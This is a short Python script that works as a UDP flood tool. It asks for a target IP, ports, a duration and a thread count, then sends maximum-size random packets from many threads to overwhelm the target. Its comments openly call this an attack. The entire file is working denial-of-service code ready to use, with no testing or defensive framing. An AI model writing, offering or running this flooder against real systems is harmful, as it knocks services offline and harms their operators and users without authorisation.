import os
import socket
import threading
import time

# Function to send packets
def send_packets(ip, port, duration):
    # Create a UDP socket for sending packets
    tmp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Maximum UDP packet size (65,507 bytes)
    data = os.urandom(65507)  # Random data for maximum packet size

    # Get the end time for the attack
    end_time = time.time() + duration

    # Start sending packets as fast as possible
    while time.time() < end_time:
        try:
            tmp_sock.sendto(data, (ip, port))
        except socket.error:
            pass  # Ignore any errors if the server drops packets

    tmp_sock.close()

# Function to start the attack
def start_attack(ip, ports, duration, thread_count):
    # Start packet-sending threads for each port
    threads = []
    for port in ports:
        for _ in range(thread_count):
            thread = threading.Thread(target=send_packets, args=(ip, port, duration))
            thread.daemon = True  # Mark as daemon so they exit cleanly
            threads.append(thread)
            thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Get inputs from user
    ip = input("Enter the server IP: ")
    ports = list(map(int, input("Enter the target ports (comma-separated): ").split(',')))
    duration = int(input("Enter the duration of the attack in seconds: "))  # Duration in seconds
    thread_count = int(input("Enter the number of threads per port: "))

    # Start the attack
    start_attack(ip, ports, duration, thread_count)
